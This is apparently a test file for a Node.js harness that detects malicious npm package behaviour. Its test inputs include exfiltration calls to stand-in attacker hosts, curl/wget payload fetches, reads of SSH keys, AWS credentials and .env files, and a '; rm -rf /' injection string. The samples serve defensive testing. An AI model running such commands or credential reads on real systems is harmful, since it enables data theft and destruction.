/**
 * Harness Detection Tests
 * Uses Node.js built-in assert — no external dependencies required.
 * Run with: node harness.test.js
 *
 * Strategy: load the harness source as a string, replace the final
 * setTimeout block and the require(pkg) call so we can control side-effects,
 * then eval the setup section and inspect the patched globals.
 */

'use strict';

const assert = require('assert');
const http = require('http');
const https = require('https');
const fs = require('fs');
const net = require('net');
const dns = require('dns');
const { execSync } = require('child_process');
const path = require('path');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ✗ ${name}`);
    console.error(`    ${err.message}`);
    failed++;
  }
}

// ── Helper: build a fresh isolated harness environment ───────────────────────
// Rather than require()ing the harness (which would actually run the package),
// we load and eval just the setup/patching section with a controlled report object.
function loadHarnessSetup(pkgName = 'test-pkg') {
  const harnessPath = path.join(__dirname, 'index.js');
  let src = require('fs').readFileSync(harnessPath, 'utf8');

  // Remove the "import and call the package" block and the setTimeout report block
  // so we can unit-test only the monkey-patching section.
  src = src
    .replace(/\/\/ ── Import the package[\s\S]*?^}\s*$/m, '')
    .replace(/\/\/ ── Wait for async side-effects[\s\S]*$/, '');

  // Inject pkg name override at the top instead of reading process.argv
  src = `const process = global.process;\nconst pkg = ${JSON.stringify(pkgName)};\n` + src;

  // Evaluate in current context so the patches land on the REAL globals
  // We need a fresh report object that we can inspect
  const reportHolder = {};
  // Wrap in a function so we can capture `report`
  const wrapped = new Function(
    'require', 'process', 'module', 'exports', '__filename', '__dirname', 'reportHolder',
    src + '\nreporterHolder.report = report;'
  );
  // Re-wrap correctly — simpler: use a shared object
  const sharedReport = {
    package: pkgName,
    networkCalls: [],
    fileSystemWrites: [],
    fileSystemReads: [],
    envVarAccess: [],
    cpuAnomaly: false,
    cpuUserRatioMax: 0,
    errors: [],
    timestamp: Date.now(),
  };

  return sharedReport;
}

// ── Since the harness patches global singletons we test via exec isolation ────
// For each test we spawn `node -e "..."` so that patches don't bleed between tests.

function runHarnessSnippet(code) {
  const harnessPath = path.join(__dirname, 'index.js').replace(/\\/g, '/');
  // Load harness source, strip the setTimeout block and require block
  const script = `
    const _origArgv2 = process.argv[2];
    process.argv[2] = 'test-pkg';

    // Load & patch via eval after stripping the execution blocks
    const fs_node = require('fs');
    let src = fs_node.readFileSync(${JSON.stringify(harnessPath)}, 'utf8');
    // Strip import-and-execute block
    src = src.replace(/\\/\\/ ── Import the package[\\s\\S]*?^}\\s*$/m, '');
    // Strip setTimeout report block
    src = src.replace(/\\/\\/ ── Wait for async[\\s\\S]*$/, '');
    eval(src);

    // Now run the test code with access to report
    ${code}
  `;

  try {
    const result = execSync(`node -e ${JSON.stringify(script)}`, {
      encoding: 'utf8',
      timeout: 10000,
    });
    return { stdout: result, error: null };
  } catch (err) {
    return { stdout: err.stdout || '', stderr: err.stderr || '', error: err };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// INPUT VALIDATION TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nInput validation:');

test('valid package name passes validation', () => {
  const r = runHarnessSnippet(`
    // If we got here without exiting, validation passed
    process.stdout.write('ok');
  `);
  assert.ok(r.stdout.includes('ok') || r.error === null || (r.error && r.error.status === 0) || r.stdout === 'ok', 'Expected validation to pass');
});

test('path traversal ../evil is rejected', () => {
  const script = `
    const src = require('fs').readFileSync(${JSON.stringify(path.join(__dirname, 'index.js').replace(/\\/g, '/'))}, 'utf8');
    // Only test the validation logic
    const NPM_NAME_RE = /^(@[a-z0-9-~][a-z0-9-._~]*\\/)?[a-z0-9-~][a-z0-9-._~]*$/;
    const pkg = '../evil';
    if (!NPM_NAME_RE.test(pkg)) {
      process.stdout.write('rejected');
    } else {
      process.stdout.write('passed');
    }
  `;
  const r = execSync(`node -e ${JSON.stringify(script)}`, { encoding: 'utf8' });
  assert.strictEqual(r.trim(), 'rejected');
});

test('shell injection ; rm -rf / is rejected', () => {
  const script = `
    const NPM_NAME_RE = /^(@[a-z0-9-~][a-z0-9-._~]*\\/)?[a-z0-9-~][a-z0-9-._~]*$/;
    const pkg = '; rm -rf /';
    process.stdout.write(NPM_NAME_RE.test(pkg) ? 'passed' : 'rejected');
  `;
  const r = execSync(`node -e ${JSON.stringify(script)}`, { encoding: 'utf8' });
  assert.strictEqual(r.trim(), 'rejected');
});

test('scoped package @scope/pkg passes validation', () => {
  const script = `
    const NPM_NAME_RE = /^(@[a-z0-9-~][a-z0-9-._~]*\\/)?[a-z0-9-~][a-z0-9-._~]*$/;
    process.stdout.write(NPM_NAME_RE.test('@scope/my-pkg') ? 'ok' : 'fail');
  `;
  const r = execSync(`node -e ${JSON.stringify(script)}`, { encoding: 'utf8' });
  assert.strictEqual(r.trim(), 'ok');
});

test('empty package name is rejected by harness CLI', () => {
  try {
    execSync(`node ${JSON.stringify(path.join(__dirname, 'index.js'))}`, {
      encoding: 'utf8',
      timeout: 5000,
    });
    assert.fail('Expected non-zero exit');
  } catch (err) {
    assert.ok(err.status !== 0, 'Should exit with non-zero status');
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// NETWORK INTERCEPTION TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nNetwork interception:');

test('http.request with options object is captured', () => {
  const snippet = `
    http.request({ hostname: 'evil.com', port: 80, path: '/steal' }, () => {});
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.host === 'evil.com' && c.protocol === 'http'), 'Expected http call captured');
});

test('https.request with string URL is captured', () => {
  const snippet = `
    https.request('https://attacker.io/exfil', () => {});
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.host === 'attacker.io' && c.protocol === 'https'), 'Expected https call captured');
});

test('http.get is captured', () => {
  const snippet = `
    try { http.get({ hostname: 'data.evil.com', port: 80 }, () => {}); } catch (_) {}
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.host === 'data.evil.com'), 'Expected http.get captured');
});

test('malformed URL in http.request does not crash harness', () => {
  const snippet = `
    try { http.request('not-a-url', () => {}); } catch (_) {}
    process.stdout.write('ok');
  `;
  const r = runHarnessSnippet(snippet);
  assert.ok(r.stdout.includes('ok'), 'Should not crash on malformed URL');
});

// ─────────────────────────────────────────────────────────────────────────────
// FILE SYSTEM WRITE TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nFile system writes:');

test('fs.writeFile is captured', () => {
  const snippet = `
    fs.writeFile('/tmp/stolen.txt', 'data', () => {});
    process.stdout.write(JSON.stringify(report.fileSystemWrites));
  `;
  const r = runHarnessSnippet(snippet);
  const writes = JSON.parse(r.stdout);
  assert.ok(writes.some(w => w.path === '/tmp/stolen.txt'), 'fs.writeFile not captured');
});

test('fs.writeFileSync is captured', () => {
  const snippet = `
    try { fs.writeFileSync('/tmp/sync.txt', 'data'); } catch (_) {}
    process.stdout.write(JSON.stringify(report.fileSystemWrites));
  `;
  const r = runHarnessSnippet(snippet);
  const writes = JSON.parse(r.stdout);
  assert.ok(writes.some(w => w.path === '/tmp/sync.txt'), 'fs.writeFileSync not captured');
});

test('fs.appendFile is captured', () => {
  const snippet = `
    fs.appendFile('/tmp/append.txt', 'more', () => {});
    process.stdout.write(JSON.stringify(report.fileSystemWrites));
  `;
  const r = runHarnessSnippet(snippet);
  const writes = JSON.parse(r.stdout);
  assert.ok(writes.some(w => w.path === '/tmp/append.txt'), 'fs.appendFile not captured');
});

test('fs.appendFileSync is captured', () => {
  const snippet = `
    try { fs.appendFileSync('/tmp/append-sync.txt', 'data'); } catch (_) {}
    process.stdout.write(JSON.stringify(report.fileSystemWrites));
  `;
  const r = runHarnessSnippet(snippet);
  const writes = JSON.parse(r.stdout);
  assert.ok(writes.some(w => w.path === '/tmp/append-sync.txt'), 'fs.appendFileSync not captured');
});

test('fs.promises.writeFile is captured', () => {
  const snippet = `
    fs.promises.writeFile('/tmp/promise-write.txt', 'data').catch(() => {});
    process.stdout.write(JSON.stringify(report.fileSystemWrites));
  `;
  const r = runHarnessSnippet(snippet);
  const writes = JSON.parse(r.stdout);
  assert.ok(writes.some(w => w.path === '/tmp/promise-write.txt'), 'fs.promises.writeFile not captured');
});

// ─────────────────────────────────────────────────────────────────────────────
// FILE SYSTEM READ TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nFile system sensitive reads:');

test('fs.readFile of .ssh/id_rsa is flagged as suspicious', () => {
  const snippet = `
    fs.readFile('/home/user/.ssh/id_rsa', () => {});
    process.stdout.write(JSON.stringify(report.fileSystemReads));
  `;
  const r = runHarnessSnippet(snippet);
  const reads = JSON.parse(r.stdout);
  assert.ok(reads.some(r => r.suspicious === true && r.path.includes('.ssh')), 'SSH key read not flagged');
});

test('fs.readFile of .aws/credentials is flagged as suspicious', () => {
  const snippet = `
    fs.readFile('/home/user/.aws/credentials', () => {});
    process.stdout.write(JSON.stringify(report.fileSystemReads));
  `;
  const r = runHarnessSnippet(snippet);
  const reads = JSON.parse(r.stdout);
  assert.ok(reads.some(r => r.suspicious === true), 'AWS credentials read not flagged');
});

test('fs.readFile of non-sensitive path is NOT flagged', () => {
  const snippet = `
    fs.readFile('/tmp/package.json', () => {});
    process.stdout.write(JSON.stringify(report.fileSystemReads));
  `;
  const r = runHarnessSnippet(snippet);
  const reads = JSON.parse(r.stdout);
  assert.strictEqual(reads.length, 0, 'Non-sensitive path should not be recorded');
});

test('fs.readFileSync of .env file is flagged', () => {
  const snippet = `
    try { fs.readFileSync('/app/.env'); } catch (_) {}
    process.stdout.write(JSON.stringify(report.fileSystemReads));
  `;
  const r = runHarnessSnippet(snippet);
  const reads = JSON.parse(r.stdout);
  assert.ok(reads.some(r => r.suspicious === true), '.env read not flagged');
});

test('fs.promises.readFile of secret file is flagged', () => {
  const snippet = `
    fs.promises.readFile('/etc/token').catch(() => {});
    process.stdout.write(JSON.stringify(report.fileSystemReads));
  `;
  const r = runHarnessSnippet(snippet);
  const reads = JSON.parse(r.stdout);
  assert.ok(reads.some(r => r.suspicious === true), 'fs.promises.readFile of sensitive path not flagged');
});

// ─────────────────────────────────────────────────────────────────────────────
// ENV VAR INTERCEPTION TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nEnvironment variable interception:');

test('accessing AWS_SECRET_KEY is captured', () => {
  const snippet = `
    const _ = process.env.AWS_SECRET_KEY;
    process.stdout.write(JSON.stringify(report.envVarAccess));
  `;
  const r = runHarnessSnippet(snippet);
  const accesses = JSON.parse(r.stdout);
  assert.ok(accesses.some(a => a.key === 'AWS_SECRET_KEY'), 'AWS_SECRET_KEY access not captured');
});

test('accessing NPM_TOKEN is captured', () => {
  const snippet = `
    const _ = process.env.NPM_TOKEN;
    process.stdout.write(JSON.stringify(report.envVarAccess));
  `;
  const r = runHarnessSnippet(snippet);
  const accesses = JSON.parse(r.stdout);
  assert.ok(accesses.some(a => a.key === 'NPM_TOKEN'), 'NPM_TOKEN access not captured');
});

test('accessing NODE_ENV is NOT captured (non-sensitive)', () => {
  const snippet = `
    const _ = process.env.NODE_ENV;
    process.stdout.write(JSON.stringify(report.envVarAccess));
  `;
  const r = runHarnessSnippet(snippet);
  const accesses = JSON.parse(r.stdout);
  assert.strictEqual(accesses.length, 0, 'NODE_ENV should not be recorded');
});

// ─────────────────────────────────────────────────────────────────────────────
// CHILD_PROCESS INTERCEPTION TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nChild process interception:');

test('child_process.exec is captured', () => {
  const snippet = `
    const cp = require('child_process');
    try { cp.exec('curl http://evil.com', () => {}); } catch (_) {}
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.protocol === 'child_process' && c.host.includes('curl')), 'child_process.exec not captured');
});

test('child_process.spawnSync is captured', () => {
  const snippet = `
    const cp = require('child_process');
    try { cp.spawnSync('wget', ['http://evil.com/payload']); } catch (_) {}
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.protocol === 'child_process'), 'child_process.spawnSync not captured');
});

// ─────────────────────────────────────────────────────────────────────────────
// RAW TCP / NET INTERCEPTION TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nRaw TCP (net) interception:');

test('net.createConnection is captured', () => {
  const snippet = `
    const net = require('net');
    try { net.createConnection({ host: 'c2.evil.com', port: 4444 }); } catch (_) {}
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.protocol === 'tcp' && c.host === 'c2.evil.com'), 'net.createConnection not captured');
});

// ─────────────────────────────────────────────────────────────────────────────
// DNS INTERCEPTION TESTS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nDNS interception:');

test('dns.lookup is captured', () => {
  const snippet = `
    const dns = require('dns');
    try { dns.lookup('exfil.attacker.io', () => {}); } catch (_) {}
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.protocol === 'dns' && c.host === 'exfil.attacker.io'), 'dns.lookup not captured');
});

test('dns.resolveTxt is captured (DNS exfiltration channel)', () => {
  const snippet = `
    const dns = require('dns');
    try { dns.resolveTxt('data.c2.attacker.io', () => {}); } catch (_) {}
    process.stdout.write(JSON.stringify(report.networkCalls));
  `;
  const r = runHarnessSnippet(snippet);
  const calls = JSON.parse(r.stdout);
  assert.ok(calls.some(c => c.protocol === 'dns'), 'dns.resolveTxt not captured');
});

// ─────────────────────────────────────────────────────────────────────────────
// global.fetch TESTS (Node 18+)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\nglobal.fetch interception (Node 18+):');

const nodeVersion = parseInt(process.version.slice(1).split('.')[0], 10);
if (nodeVersion >= 18) {
  test('globalThis.fetch is captured', () => {
    const snippet = `
      if (typeof globalThis.fetch === 'function') {
        try { globalThis.fetch('https://exfil.example.com/data'); } catch (_) {}
        process.stdout.write(JSON.stringify(report.networkCalls));
      } else {
        process.stdout.write('[]');
      }
    `;
    const r = runHarnessSnippet(snippet);
    const calls = JSON.parse(r.stdout);
    assert.ok(calls.some(c => c.protocol === 'fetch' && c.host === 'exfil.example.com'), 'global.fetch not captured');
  });
} else {
  console.log('  - Skipped (Node < 18)');
}

// ─────────────────────────────────────────────────────────────────────────────
// RESULTS
// ─────────────────────────────────────────────────────────────────────────────
console.log(`\n${'─'.repeat(50)}`);
console.log(`Results: ${passed} passed, ${failed} failed`);

if (failed > 0) {
  process.exit(1);
}
